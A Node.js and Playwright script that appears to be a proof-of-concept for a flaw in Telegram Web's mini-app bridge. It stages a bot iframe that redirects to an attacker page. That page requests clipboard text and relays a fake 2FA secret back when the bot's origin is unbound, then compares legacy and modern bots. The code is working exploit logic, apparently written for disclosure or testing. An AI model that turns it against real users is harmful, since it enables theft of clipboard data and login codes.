// Dynamic test of the REAL Telegram Web bridge logic (telegramWebView.ts):
// reproduces onMessage (line 71) and dispatch (line 119) verbatim, drives a
// real cross-origin iframe navigation in Chromium. Legacy bot (origin
// undefined) => bridge trusts attacker on input and leaks results on output.
const http = require('http');
const { chromium } = require('playwright');

let BOT_URL = '', ATK_URL = '', BOUND = 'null';

const pages = {
  host: () => `<!doctype html><title>host</title><body><script>
    const inst = { origin: ${/*injected*/''}BOUND_ORIGIN, iframe: null };
    window.__inbound = [];
    function onMessage(origin, data){ // verbatim telegramWebView.ts:71
      if (inst.origin && origin !== inst.origin || typeof(data) !== 'string') return;
      window.__inbound.push({origin, data});
    }
    window.addEventListener('message', e => {
      if (inst.iframe && e.source === inst.iframe.contentWindow && typeof e.data==='string' && e.data[0]==='{') onMessage(e.origin, e.data);
      if (typeof e.data==='string' && e.data.indexOf('ATTACKER_GOT:')===0) window.__attackerGot = e.data;
    });
    const f = document.createElement('iframe');
    f.setAttribute('sandbox','allow-scripts allow-same-origin allow-popups allow-forms');
    f.src = 'BOT_URL';
    inst.iframe = f; document.body.appendChild(f);
    window.__dispatch = () => inst.iframe.contentWindow.postMessage(JSON.stringify({eventType:'clipboard_text_received',eventData:{data:'SECRET-2FA 889922'}}), inst.origin || '*'); // verbatim :119
  </script></body>`,
  bot: () => `<!doctype html><title>bot</title><script>location.href='ATK_URL';</script>`,
  attacker: () => `<!doctype html><title>attacker</title><script>
    addEventListener('message', e => { try{parent.postMessage('ATTACKER_GOT:'+JSON.stringify(e.data),'*');}catch(_){} });
    parent.postMessage(JSON.stringify({eventType:'web_app_read_text_from_clipboard',eventData:{req_id:'x'}}),'*');
  </script>`,
};

function server(which){
  return http.createServer((req,res)=>{
    let h = pages[which]();
    h = h.replace('BOT_URL', BOT_URL).replace('ATK_URL', ATK_URL).replace('BOUND_ORIGIN', BOUND);
    res.writeHead(200,{'content-type':'text/html'}); res.end(h);
  });
}

(async () => {
  const hostS=server('host'), botS=server('bot'), atkS=server('attacker');
  await new Promise(r=>hostS.listen(0,'127.0.0.1',r));
  await new Promise(r=>botS.listen(0,'127.0.0.1',r));
  await new Promise(r=>atkS.listen(0,'127.0.0.1',r));
  BOT_URL=`http://127.0.0.1:${botS.address().port}/`;
  ATK_URL=`http://127.0.0.1:${atkS.address().port}/`;
  const hostUrl=`http://127.0.0.1:${hostS.address().port}/`;
  const browser = await chromium.launch({args:['--no-sandbox']});

  async function run(label, bound){
    BOUND = bound;
    const page = await browser.newPage();
    await page.goto(hostUrl, {waitUntil:'domcontentloaded'});
    await page.waitForTimeout(1500);                     // iframe: bot -> attacker nav
    await page.evaluate(()=>window.__dispatch&&window.__dispatch());
    await page.waitForTimeout(600);
    const inbound = await page.evaluate(()=>window.__inbound||[]);
    const attackerGot = await page.evaluate(()=>window.__attackerGot||'(none)');
    console.log('\n==== WEB BRIDGE ('+label+'), origin bound = '+bound+' ====');
    console.log('  inbound accepted from attacker-origin iframe:', inbound.length?JSON.stringify(inbound):'(none / rejected)');
    console.log('  outbound answer reached attacker iframe:', attackerGot);
    await page.close();
  }

  await run('legacy bot (no same_origin)', 'undefined');
  await run('modern bot (same_origin)', JSON.stringify(BOT_URL.replace(/\/$/,'')));

  await browser.close(); hostS.close(); botS.close(); atkS.close();
})().catch(e=>{console.error(String(e).split('\n')[0]);process.exit(1);});
